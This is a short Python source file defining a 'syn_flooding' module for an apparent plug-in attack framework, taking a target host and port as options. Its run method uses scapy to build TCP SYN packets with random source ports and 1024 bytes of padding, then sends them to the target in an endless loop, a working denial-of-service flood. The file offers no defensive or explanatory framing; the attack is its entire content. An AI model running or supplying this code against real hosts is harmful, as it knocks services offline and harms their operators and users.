from scapy.layers.inet import TCP, IP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort

from module import Module, Type


class SYNFlooding(Module):

    def __init__(self):
        super().__init__("syn_flooding",
                         ["syn", "flooding", "flood", "dos"],
                         "syn flooding attack")

        self.add_option("RHOST", "target host", required=True, type=Type.host)
        self.add_option("RPORT", "target port", required=True, type=Type.int)

    def run(self):
        pkt = (IP(dst=self.rhost) /
               TCP(sport=RandShort(), dport=self.rport, flags="S") /
               Raw(b"X" * 1024))

        try:
            send(pkt, loop=True, verbose=False)
        except KeyboardInterrupt:
            pass
